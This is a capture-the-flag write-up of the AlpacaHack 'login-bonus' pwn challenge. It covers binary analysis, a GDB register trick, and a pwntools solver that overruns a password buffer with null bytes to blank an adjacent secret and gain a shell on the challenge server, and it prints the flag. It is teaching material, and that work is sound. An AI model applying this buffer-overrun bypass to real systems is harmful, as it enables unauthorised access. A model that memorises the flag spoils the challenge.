---
title: "Daily AlpacaHack: login-bonus"
description: 'This is my write up solving daily challenge from AlpacaHack'
date: 2025-12-17
tags: ["Binary Exploitation", "AlpacaHack", "Writeup"]
image: 'https://pbs.twimg.com/media/G7Axcw8bIAE1vR5.jpg'
authors: ['chjwoo']
draft: false
---

Hello guys! In this blog post, I solved the Daily AlpacaHack pwn challenge. I’m still learning pwn, so this write-up focuses on my thought process, the mistakes I made along the way, and how I eventually solved them. 😭

## Description

```
Guess my password.
nc 34.170.146.252 6555
https://alpacahack.com/daily/challenges/login-bonus    
```

### Initial Analysis

First, download the challenge files and extract them locally for inspection.

```bash
┌──(chjwoo㉿hackbox)-[~/…/alpacahack/pwn/login-bonus/login-bonus]
└─$ ls
compose.yaml  Dockerfile  flag.txt  login  login.c
                                                                                                                                                                                             
┌──(chjwoo㉿hackbox)-[~/…/alpacahack/pwn/login-bonus/login-bonus]
└─$ file login     
login: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped
                                                                                                                                                                                             
┌──(chjwoo㉿hackbox)-[~/…/alpacahack/pwn/login-bonus/login-bonus]
└─$ checksec login
[*] '/mnt/hgfs/cybersec/ctfs/alpacahack/pwn/login-bonus/login-bonus/login'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No

```

This confirms that the binary is a **64-bit ELF** with the following properties:

- **PIE enabled** – Code addresses are randomized at runtime
- **NX enabled** – The stack is non-executable
- **Full RELRO** – GOT entries are read-only
- **No stack canary** – Stack overflows are not detected
- **Not stripped** – Symbols are preserved, simplifying analysis

### Source code analysis

Let’s take a closer look at the source code.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/random.h>

#define debug_report(fmt, ...) printf("[DEBUG] " fmt "\n", ##__VA_ARGS__)

char password[32];
char secret[32];

int main() {
  /* Input password */
  printf("Password: ");
  scanf("%[^\n]", password);

  /* Check password */
  debug_report("Authenticating...");
  if (strcmp(password, secret)) {
    puts("[-] Wrong password");
    debug_report("'%s' != '%s'", password, secret);
    
  } else {
    puts("[+] Success!");
    system("/bin/sh");
  }

  return 0;
}

__attribute__((constructor))
void setup() {
  int seed;
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  /* Generate random password */
  debug_report("Generating secure password...");
  getrandom(&seed, sizeof(seed), 0);
  srand(seed);
  for (size_t i = 0; i < 16; i++)
    secret[i] = 'A' + (rand() % 26);
}
```

The program asks the user for a password and compares it against a randomly generated secret. If the comparison succeeds, it spawns a shell.

1. **Two global buffers**: `password[32]` and `secret[32]` are stored adjacently in memory.
2. **Random secret generation**: The `setup()` function (called before `main` due to `__attribute__((constructor))`) generates a random 16-character secret
3. **Input validation**: The program uses `scanf("%[^\n]", password)` to read user input
4. **Authentication**: Success requires `strcmp(password, secret) == 0` 

### Dynamic Analysis using GDB

To better understand the runtime behavior, let’s analyze the binary using GDB. After loading the binary, list the available functions and focus on `main()`.

```bash
┌──(chjwoo㉿hackbox)-[~/…/alpacahack/pwn/login-bonus/login-bonus]
└─$ gdb-gef login 
Reading symbols from login...
(No debugging symbols found in login)
Error while writing index for `/mnt/hgfs/cybersec/ctfs/alpacahack/pwn/login-bonus/login-bonus/login': No debugging symbols
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 16.3 in 0.00ms using Python engine 3.13
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001030  puts@plt
0x0000000000001040  setbuf@plt
0x0000000000001050  system@plt
0x0000000000001060  printf@plt
0x0000000000001070  srand@plt
0x0000000000001080  strcmp@plt
0x0000000000001090  __isoc99_scanf@plt
0x00000000000010a0  getrandom@plt
0x00000000000010b0  rand@plt
0x00000000000010c0  __cxa_finalize@plt
0x00000000000010d0  _start
0x0000000000001100  deregister_tm_clones
0x0000000000001130  register_tm_clones
0x0000000000001170  __do_global_dtors_aux
0x00000000000011b0  frame_dummy
0x00000000000011b9  main
0x0000000000001279  setup
0x0000000000001330  __libc_csu_init
0x0000000000001390  __libc_csu_fini
0x0000000000001394  _fini
```

Now disassemble the `main` function.

```bash
gef➤  disas main
Dump of assembler code for function main:
   0x00000000000011b9 <+0>:     push   rbp
   0x00000000000011ba <+1>:     mov    rbp,rsp
   0x00000000000011bd <+4>:     lea    rax,[rip+0xe44]        # 0x2008
   0x00000000000011c4 <+11>:    mov    rdi,rax
   0x00000000000011c7 <+14>:    mov    eax,0x0
   0x00000000000011cc <+19>:    call   0x1060 <printf@plt>
   0x00000000000011d1 <+24>:    lea    rax,[rip+0x2e68]        # 0x4040 <password>
   0x00000000000011d8 <+31>:    mov    rsi,rax
   0x00000000000011db <+34>:    lea    rax,[rip+0xe31]        # 0x2013
   0x00000000000011e2 <+41>:    mov    rdi,rax
   0x00000000000011e5 <+44>:    mov    eax,0x0
   0x00000000000011ea <+49>:    call   0x1090 <__isoc99_scanf@plt>
   0x00000000000011ef <+54>:    lea    rax,[rip+0xe23]        # 0x2019
   0x00000000000011f6 <+61>:    mov    rdi,rax
   0x00000000000011f9 <+64>:    call   0x1030 <puts@plt>
   0x00000000000011fe <+69>:    lea    rax,[rip+0x2e5b]        # 0x4060 <secret>
   0x0000000000001205 <+76>:    mov    rsi,rax
   0x0000000000001208 <+79>:    lea    rax,[rip+0x2e31]        # 0x4040 <password>
   0x000000000000120f <+86>:    mov    rdi,rax
   0x0000000000001212 <+89>:    call   0x1080 <strcmp@plt>
   0x0000000000001217 <+94>:    test   eax,eax
   0x0000000000001219 <+96>:    je     0x1254 <main+155>
   0x000000000000121b <+98>:    lea    rax,[rip+0xe11]        # 0x2033
   0x0000000000001222 <+105>:   mov    rdi,rax
   0x0000000000001225 <+108>:   call   0x1030 <puts@plt>
   0x000000000000122a <+113>:   lea    rax,[rip+0x2e2f]        # 0x4060 <secret>
   0x0000000000001231 <+120>:   mov    rdx,rax
   0x0000000000001234 <+123>:   lea    rax,[rip+0x2e05]        # 0x4040 <password>
   0x000000000000123b <+130>:   mov    rsi,rax
   0x000000000000123e <+133>:   lea    rax,[rip+0xe01]        # 0x2046
   0x0000000000001245 <+140>:   mov    rdi,rax
   0x0000000000001248 <+143>:   mov    eax,0x0
   0x000000000000124d <+148>:   call   0x1060 <printf@plt>
   0x0000000000001252 <+153>:   jmp    0x1272 <main+185>
   0x0000000000001254 <+155>:   lea    rax,[rip+0xe01]        # 0x205c
   0x000000000000125b <+162>:   mov    rdi,rax
   0x000000000000125e <+165>:   call   0x1030 <puts@plt>
   0x0000000000001263 <+170>:   lea    rax,[rip+0xdff]        # 0x2069
   0x000000000000126a <+177>:   mov    rdi,rax
   0x000000000000126d <+180>:   call   0x1050 <system@plt>
   0x0000000000001272 <+185>:   mov    eax,0x0
   0x0000000000001277 <+190>:   pop    rbp
   0x0000000000001278 <+191>:   ret
End of assembler dump.
```

At offset `main+86`, the program prepares to call `strcmp(password, secret)`:

- `rdi` → pointer to `password`
- `rsi` → pointer to `secret`

This confirms the exact point where authentication occurs.

## Solution

My first approach was to bypass the authentication locally using GDB by manipulating registers at runtime. I set a breakpoint just before the `strcmp` call:

```bash

gef➤  break *main+86
Breakpoint 1 at 0x120f
gef➤  run
Starting program: /mnt/hgfs/cybersec/ctfs/alpacahack/pwn/login-bonus/login-bonus/login 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[DEBUG] Generating secure password...
Password: AAAAAAA

```

Once the breakpoint was hit, I inspected the registers and memory.

```bash
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000555555558040  →  0x0041414141414141 ("AAAAAAA"?)
$rbx   : 0x00007fffffffdce8  →  0x00007fffffffe06e  →  "/mnt/hgfs/cybersec/ctfs/alpacahack/pwn/login-bonus[...]"
$rcx   : 0x00007ffff7eab936  →  <write+0016> add rsp, 0x18
$rdx   : 0x0               
$rsp   : 0x00007fffffffdbd0  →  0x0000000000000001
$rbp   : 0x00007fffffffdbd0  →  0x0000000000000001
$rsi   : 0x0000555555558060  →  "LHSVBWWKDYODUQDY"
$rdi   : 0x00007ffff7f907b0  →  0x0000000000000000
$rip   : 0x000055555555520f  →  <main+0056> mov rdi, rax
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x0               
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x00007fffffffdcf8  →  0x00007fffffffe0b3  →  0x5245545f5353454c ("LESS_TER"?)
$r14   : 0x00007ffff7ffd000  →  0x00007ffff7ffe310  →  0x0000555555554000  →  0x00010102464c457f
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────── stack ────
0x00007fffffffdbd0│+0x0000: 0x0000000000000001   ← $rsp, $rbp
0x00007fffffffdbd8│+0x0008: 0x00007ffff7dd0ca8  →  <__libc_start_call_main+0078> mov edi, eax
0x00007fffffffdbe0│+0x0010: 0x00007ffff7f8f5c0  →  0x00000000fbad2887
0x00007fffffffdbe8│+0x0018: 0x00005555555551b9  →  <main+0000> push rbp
0x00007fffffffdbf0│+0x0020: 0x00000001ffffdc30
0x00007fffffffdbf8│+0x0028: 0x00007fffffffdce8  →  0x00007fffffffe06e  →  "/mnt/hgfs/cybersec/ctfs/alpacahack/pwn/login-bonus[...]"
0x00007fffffffdc00│+0x0030: 0x00007fffffffdce8  →  0x00007fffffffe06e  →  "/mnt/hgfs/cybersec/ctfs/alpacahack/pwn/login-bonus[...]"
0x00007fffffffdc08│+0x0038: 0x714fb311d07805a9
───────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555551fe <main+0045>      lea    rax, [rip+0x2e5b]        # 0x555555558060 <secret>
   0x555555555205 <main+004c>      mov    rsi, rax
   0x555555555208 <main+004f>      lea    rax, [rip+0x2e31]        # 0x555555558040 <password>
●→ 0x55555555520f <main+0056>      mov    rdi, rax
   0x555555555212 <main+0059>      call   0x555555555080 <strcmp@plt>
   0x555555555217 <main+005e>      test   eax, eax
   0x555555555219 <main+0060>      je     0x555555555254 <main+155>
   0x55555555521b <main+0062>      lea    rax, [rip+0xe11]        # 0x555555556033
   0x555555555222 <main+0069>      mov    rdi, rax
───────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "login", stopped 0x55555555520f in main (), reason: BREAKPOINT
───────────────────────────────────────────────────────────── trace ────
[#0] 0x55555555520f → main()
─────────────────────────────────────────────────────────────
gef➤  x/s $rsi
0x555555558060 <secret>:        "LHSVBWWKDYODUQDY"
gef➤  x/s $rax
0x555555558040 <password>:      "AAAAAAA"
```

At this point:

- `$rsi` contains the randomly generated secret: "LHSVBWWKDYODUQDY"
- `$rax` points to my input buffer: "AAAAAAA"

The next instruction (`mov rdi, rax`) will set `rdi` to point to password, then `strcmp(password, secret)` will be called. 

**Here’s the trick:** if I make both arguments passed to `strcmp` contain the same value, the function will return `0`, since the strings are equal.

```bash
gef➤  set $rax = $rsi
gef➤  c
Continuing.
[+] Success!
[Detaching after vfork from child process 3259]
$ whoami
chjwoo
$ 
```

By setting `rax = rsi`, when the instruction `mov rdi, rax` is executed, both `rdi` and `rsi` end up pointing to the same string, `secret`. As a result, the comparison becomes `strcmp(secret, secret)`, which returns `0`, allowing us to bypass authentication.

### The Problem with Remote Exploitation

This method relies entirely on debugger control, which is unavailable on the remote server:

1. We cannot attach GDB remotely
2. We cannot modify registers during execution
3. The exploit must work purely through standard input/output

I needed to find a different exploitation method that works remotely.

Re-examining the source code, I noticed the debug output:

```bash
debug_report("'%s' != '%s'", password, secret);
```

This debug statement leaks both the user input and the secret. Testing this remotely confirms the leak:

```bash
┌──(chjwoo㉿hackbox)-[~/…/alpacahack/pwn/login-bonus/login-bonus]
└─$ nc 34.170.146.252 6555
[DEBUG] Generating secure password...
Password: chjwoo
[DEBUG] Authenticating...
[-] Wrong password
[DEBUG] 'chjwoo' != 'CSAENYYJPWPKRCXI'
```

The secret is leaked! But there's a problem: the secret is randomly generated on each connection. If I reconnect to send the leaked secret, I get a different random secret. I decided to test what happens when sending exactly 32 bytes (the size of the password buffer):

```bash
┌──(chjwoo㉿hackbox)-[/mnt/…/alpacahack/pwn/login-bonus/login-bonus]
└─$ python
Python 3.13.9 (main, Oct 15 2025, 14:56:22) [GCC 15.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> print("A"*32)
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

┌──(chjwoo㉿hackbox)-[~/…/alpacahack/pwn/login-bonus/login-bonus]
└─$ nc 34.170.146.252 6555
[DEBUG] Generating secure password...
Password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[DEBUG] Authenticating...
[-] Wrong password
[DEBUG] 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' != ''
```

**Wait... the secret is now an empty string!**

This reveals a critical vulnerability. When `scanf` reads 32 bytes:

1. `scanf("%[^\n]", password)` reads 32 bytes into `password[0..31]`
2. `scanf` automatically appends a null terminator at `password[32]`
3. Since `password` and `secret` are adjacent, `password[32]` overlaps with `secret[0]`
4. The null byte overwrites `secret[0]`, making `secret` appear empty
5. `strcmp` now sees `secret` as `""`

If we can make both `password` and `secret` appear empty, authentication will succeed. We achieve this by sending **32 null bytes**, ensuring:

- `password` starts with `\x00`
- `secret[0]` is overwritten with `\x00`

So this is my final solver:

```python
from pwn import *

HOST = '34.170.146.252'
PORT = 6555

io = remote(HOST, PORT)
io.recvuntil(b'Password: ')
io.send(b'\x00' * 32 + b'\n')
io.interactive()
```

Here's what happens:

1. `scanf` reads 32 null bytes into `password`
2. The terminating null byte overwrites `secret[0]`
3. Both strings effectively become empty
4. `strcmp("","")` returns 0
5. Authentication succeeds and a shell is spawned

```bash
┌──(chjwoo㉿hackbox)-[~/…/alpacahack/pwn/login-bonus/login-bonus]
└─$ python solver.py
[+] Opening connection to 34.170.146.252 on port 6555: Done
[*] Switching to interactive mode
[DEBUG] Authenticating...
[+] Success!
$ ls
bin
boot
dev
etc
flag-d592fd27eb4de74af194fda7990796ec.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat flag-d592fd27eb4de74af194fda7990796ec.txt
Alpaca{h0w_d1d_U_gu3s5_i7}
$  
```

## Flag

`Alpaca{h0w_d1d_U_gu3s5_i7}`